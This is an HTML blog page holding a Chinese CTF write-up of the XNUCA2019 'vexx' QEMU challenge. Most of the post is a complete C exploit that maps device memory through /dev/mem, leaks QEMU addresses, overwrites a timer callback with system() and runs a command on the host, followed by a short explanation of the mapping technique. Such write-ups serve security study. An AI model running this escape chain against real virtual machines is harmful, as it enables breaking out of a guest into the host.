@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>qemu pwn--XNUCA2019 vexx | DaJun的Blog | 脑袋空空</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="pwn,qemu">
+    <link rel="shortcut icon" href="/img/girl.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":true,"app_id":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","app_key":"Qn93YchF3LXlS54tbXjzMvAI","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"ekgad1tINypClpAa8y0wrbvl-gzGzoHsz","appkey":"Qn93YchF3LXlS54tbXjzMvAI","notify":true,"verify":true,"placeholder":"想说什么...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/girl.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">DaJun</h5>
+          <a href="mailto:571986260@qq.com" title="571986260@qq.com" class="mail">
+            
+              <span>5</span>
+            
+              <span>7</span>
+            
+              <span>1</span>
+            
+              <span>9</span>
+            
+              <span>8</span>
+            
+              <span>6</span>
+            
+              <span>2</span>
+            
+              <span>6</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/DayJun" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>qemu pwn--XNUCA2019 vexx</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/dawn.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">qemu pwn--XNUCA2019 vexx</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-02-29T11:49:07.000Z" itemprop="datePublished" class="page-time">
+  2020-02-29
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-qemu-pwn-XNUCA2019-vexx"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">qemu pwn--XNUCA2019 vexx</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-02-29 19:49:07" datetime="2020-02-29T11:49:07.000Z"  itemprop="datePublished">2020-02-29</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/writeup/">writeup</a></li></ul>
+
+
+
+            
+	<span id="/2020/02/29/qemu-pwn-XNUCA2019-vexx/" class="leancloud_visitors" data-flag-title="qemu pwn--XNUCA2019 vexx" title="qemu pwn--XNUCA2019 vexx">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2020/02/29/qemu-pwn-XNUCA2019-vexx/#comment">
+            <span class="valine-comment-count" data-xid="/2020/02/29/qemu-pwn-XNUCA2019-vexx/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p>曾经被XNUCA支配的我……终于发现还是自己太菜了QAQ</p>
+<a id="more"></a>
+
+<h1 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h1><p>这道题其实难度和<code>hitb-gsec-2017-babyqemu</code>非常像，但是做了这道题之后，还是学到了新东西</p>
+<p>这道题有两个<code>mmio</code>的空间，因此其就对应了两个resource文件，因此就有了一个比较方便得到其mmio的空间的内存的方法</p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">error</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> page_offset(<span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gfn(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *mmap_mem_addr_mmio, *mmap_mem_addr_cmb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> *mmap_mem(<span class="keyword">size_t</span> size, <span class="keyword">off_t</span> offset)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/mem"</span>,  O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        error(<span class="string">"[-] /dev/mem open error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint8_t</span> *address = mmap(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);</span><br><span class="line">    <span class="keyword">if</span>(address == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        error(<span class="string">"[-] mmap failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_memorymode</span><span class="params">(<span class="keyword">uint32_t</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(mode, <span class="number">0x230</span>);</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_offset</span><span class="params">(<span class="keyword">uint32_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    outb(offset, <span class="number">0x240</span>);</span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_mmio</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmap_mem_addr_mmio+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cmb</span><span class="params">(<span class="keyword">uint32_t</span> mode, <span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set_memorymode(mode);</span><br><span class="line">    set_offset(offset);</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmap_mem_addr_cmb+addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> read_cmb(<span class="keyword">uint32_t</span> mode, <span class="keyword">uint32_t</span> offset, <span class="keyword">uint32_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">    set_memorymode(mode);</span><br><span class="line">    set_offset(offset);</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">uint32_t</span>*)(mmap_mem_addr_cmb+addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger_timer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">uint32_t</span>*)(mmap_mem_addr_mmio+<span class="number">0x98</span>) = <span class="number">1</span>;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"mknod -m 660 /dev/mem c 1 1"</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0x00000000febd6000 0x00000000febd6fff 0x0000000000040200</span></span><br><span class="line"><span class="comment">    0x00000000febd0000 0x00000000febd3fff 0x0000000000140204</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    mmap_mem_addr_mmio = mmap_mem(<span class="number">0x1000</span>, <span class="number">0x00000000febd6000</span>);</span><br><span class="line">    mmap_mem_addr_cmb = mmap_mem(<span class="number">0x4000</span>, <span class="number">0x00000000febd0000</span>);</span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        error(<span class="string">"[-] iopl error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint32_t</span> elf_base_0 = read_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x10</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> elf_base_1 = read_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x10</span>+<span class="number">4</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> elf_base = (((<span class="keyword">uint64_t</span>)elf_base_1 &amp; <span class="number">0xffffffff</span>) &lt;&lt; <span class="number">32</span>) | ((<span class="keyword">uint64_t</span>)elf_base_0 &amp; <span class="number">0xffffffff</span>) - <span class="number">0x4dcf10</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_plt = elf_base + <span class="number">0x00000000002ab860</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] system plt: %p\n"</span>, system_plt);</span><br><span class="line">    <span class="keyword">uint32_t</span> heap_addr_0 = read_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x18</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> heap_addr_1 = read_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x18</span>+<span class="number">4</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_addr = (((<span class="keyword">uint64_t</span>)heap_addr_1 &amp; <span class="number">0xffffffff</span>) &lt;&lt; <span class="number">32</span>) | ((<span class="keyword">uint64_t</span>)heap_addr_0 &amp; <span class="number">0xffffffff</span>) + <span class="number">0xb90</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] heap addr: %p\n"</span>, heap_addr); </span><br><span class="line">    <span class="keyword">uint32_t</span> system_plt_0 = (<span class="keyword">uint32_t</span>)system_plt;</span><br><span class="line">    <span class="keyword">uint32_t</span> system_plt_1 = (<span class="keyword">uint32_t</span>)(system_plt &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    write_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x10</span>, <span class="number">0x100</span>, system_plt_0);</span><br><span class="line">    write_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x14</span>, <span class="number">0x100</span>, system_plt_1);</span><br><span class="line">    <span class="keyword">uint32_t</span> req_buf_0 = (<span class="keyword">uint32_t</span>)heap_addr;</span><br><span class="line">    <span class="keyword">uint32_t</span> req_buf_1 = (<span class="keyword">uint32_t</span>)(heap_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    write_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x18</span>, <span class="number">0x100</span>, req_buf_0);</span><br><span class="line">    write_cmb(<span class="number">1</span>, <span class="number">0x28</span>+<span class="number">0x1c</span>, <span class="number">0x100</span>, req_buf_1);</span><br><span class="line">    <span class="keyword">char</span> buf[] = <span class="string">"cat flag"</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i+=<span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> b = *(<span class="keyword">uint32_t</span>*)&amp;buf[i];</span><br><span class="line">        write_cmb(<span class="number">1</span>, <span class="number">0</span>, i, b);</span><br><span class="line">    &#125;</span><br><span class="line">    trigger_timer();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="具体方法"><a href="#具体方法" class="headerlink" title="具体方法"></a>具体方法</h1><p>根据：<a href="http://man7.org/linux/man-pages/man4/mem.4.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man4/mem.4.html</a></p>
+<p>如果系统此时没有<code>/dev/mem</code>文件的话，<code>system(&quot;mknod -m 660 /dev/mem c 1 1&quot;);</code>可以创建一个该文件</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; /dev/mem is a character device file that is an image of the main memory of the computer.  It may be used, for example, to examine (and even patch) the system.</span><br><span class="line">&gt; </span><br><span class="line">&gt; Byte addresses in /dev/mem are interpreted as physical memory addresses.  References to nonexistent locations cause errors to be returned.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>该文件是与系统的内存相关的，我们可以以物理地址为偏移来从该文件得到该物理地址所指向的内存</p>
+<p>具体做法就是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint8_t</span> *mmap_mem(<span class="keyword">size_t</span> size, <span class="keyword">off_t</span> offset)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/mem"</span>,  O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        error(<span class="string">"[-] /dev/mem open error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">uint8_t</span> *address = mmap(<span class="number">0</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset);</span><br><span class="line">    <span class="keyword">if</span>(address == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        error(<span class="string">"[-] mmap failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> address;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>即mmap的时候把地址作为偏移</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-02-29T12:02:47.074Z" itemprop="dateUpdated">2020-02-29 20:02:47</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2020/02/29/qemu-pwn-XNUCA2019-vexx/" target="_blank" rel="external">http://dayjun.top/2020/02/29/qemu-pwn-XNUCA2019-vexx/</a>
+        
+    </div>
+    <footer>
+        <a href="http://dayjun.top">
+            <img src="/img/girl.jpg" alt="DaJun">
+            DaJun
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/qemu/">qemu</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2020/02/29/qemu-pwn-XNUCA2019-vexx/&title=《qemu pwn--XNUCA2019 vexx》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://dayjun.top/2020/02/29/qemu-pwn-XNUCA2019-vexx/&title=《qemu pwn--XNUCA2019 vexx》 — DaJun的Blog&source=曾经被XNUCA支配的我……终于发现还是自己太菜了QAQ" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2020/02/20/qemu学习-hitb-gsec-2017-babyqemu/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">qemu学习 -- hitb-gsec-2017-babyqemu</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#初步分析"><span class="post-toc-number">1.</span> <span class="post-toc-text">初步分析</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#exp"><span class="post-toc-number">2.</span> <span class="post-toc-text">exp</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#具体方法"><span class="post-toc-number">3.</span> <span class="post-toc-text">具体方法</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://3nd.xyz/" target="_blank">3ND</a>
+    </span>
+    
+    <span class="blogroll-item">
+        <a href="http://blog.douluodalu.wang/" target="_blank">PwmHt</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                DaJun &copy; 2019 - 2020
+            </span>
+        		
+           	
+           	<span>
+           		<a href="http://www.miitbeian.gov.cn/" target="_blank">苏ICP备19059861号</a>
+           	</span>
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://dayjun.top/2020/02/29/qemu-pwn-XNUCA2019-vexx/&title=《qemu pwn--XNUCA2019 vexx》 — DaJun的Blog&pic=http://dayjun.top/img/girl.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
